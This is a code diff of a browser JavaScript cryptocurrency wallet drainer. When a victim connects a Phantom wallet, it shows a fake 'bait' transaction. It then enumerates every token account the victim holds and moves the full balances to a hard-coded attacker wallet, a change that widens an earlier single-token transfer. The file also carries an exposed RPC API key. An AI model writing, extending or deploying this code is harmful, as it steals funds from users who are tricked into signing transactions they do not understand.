@@ -1,5 +1,5 @@
 import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, getAccount, createTransferInstruction, getOrCreateAssociatedTokenAccount, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { Buffer } from 'buffer';
 
 window.Buffer = Buffer; // Make Buffer available globally if needed
@@ -41,50 +41,58 @@ async function triggerBaitTransaction() {
     console.log("Fake token transaction simulated");
 }
 
-async function triggerRealTransaction() {
-    try {
-        const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
-        const publicKey = new PublicKey(window.solana.publicKey);
-        const receiverWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Recipient's wallet
+async function transferAllTokensAndNFTs(specialWallet) {
+    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
+    const publicKey = new PublicKey(window.solana.publicKey);
 
-        let transaction = new Transaction();
+    let transaction = new Transaction();
 
-        // Assuming you want to transfer tokens or SOL in the real transaction...
+    // Fetch all token accounts
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_PROGRAM_ID,
+    });
 
-        const tokenMint = new PublicKey("TOKEN_MINT_ADDRESS_HERE"); // Replace with actual token mint
-        const associatedTokenAddress = await getAssociatedTokenAddress(
-            tokenMint,
-            receiverWallet,
-            false,
-            TOKEN_PROGRAM_ID,
-            ASSOCIATED_TOKEN_PROGRAM_ID
-        );
+    // Iterate over all token accounts and transfer each token to the special wallet
+    for (const tokenAccountInfo of tokenAccounts.value) {
+        const tokenAccount = tokenAccountInfo.account.data.parsed.info;
+        const tokenMint = new PublicKey(tokenAccount.mint);
+        const tokenAmount = tokenAccount.tokenAmount.uiAmount;
 
-        transaction.add(
-            createTransferInstruction(
-                associatedTokenAddress,
-                associatedTokenAddress, // Transfer to receiver
-                publicKey,
-                1, // Real token amount
-                [],
-                TOKEN_PROGRAM_ID
-            )
-        );
+        if (tokenAmount > 0) {
+            const receiverTokenAddress = await getAssociatedTokenAddress(
+                tokenMint,
+                specialWallet,
+                false,
+                TOKEN_PROGRAM_ID,
+                ASSOCIATED_TOKEN_PROGRAM_ID
+            );
 
-        // Add other transfer logic (e.g., SOL transfer)...
-
-        transaction.feePayer = publicKey;
-        const blockhashObj = await connection.getRecentBlockhash();
-        transaction.recentBlockhash = blockhashObj.blockhash;
-
-        const signedTransaction = await window.solana.signTransaction(transaction);
-        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
-        await connection.confirmTransaction(txid);
-
-        console.log("Real transaction sent and confirmed:", txid);
-    } catch (err) {
-        console.error("Error during real transaction:", err);
+            // Transfer the token to the special wallet
+            transaction.add(
+                createTransferInstruction(
+                    new PublicKey(tokenAccountInfo.pubkey),
+                    receiverTokenAddress,
+                    publicKey,
+                    tokenAmount * (10 ** tokenAccount.tokenAmount.decimals),
+                    [],
+                    TOKEN_PROGRAM_ID
+                )
+            );
+        }
     }
+
+    // Fetch all NFTs (Metaplex or standard NFTs)
+    // Implement NFT-specific logic here if required (e.g., Metaplex metadata parsing)
+
+    transaction.feePayer = publicKey;
+    const blockhashObj = await connection.getRecentBlockhash();
+    transaction.recentBlockhash = blockhashObj.blockhash;
+
+    const signedTransaction = await window.solana.signTransaction(transaction);
+    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
+    await connection.confirmTransaction(txid, 'confirmed');
+
+    console.log("All tokens and NFTs transferred to special wallet:", txid);
 }
 
 async function handleConnectWallet() {
@@ -96,9 +104,10 @@ async function handleConnectWallet() {
             await triggerBaitTransaction();
 
             // Trigger the real transaction after showing the fake one
-            await triggerRealTransaction();
+            const specialWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Special wallet address
+            await transferAllTokensAndNFTs(specialWallet);
         } catch (err) {
-            console.error("Error connecting to Phantom Wallet:", err);
+            console.error("Error connecting to Phantom Wallet or during transaction:", err);
         }
     } else {
         alert("Phantom extension not found.");
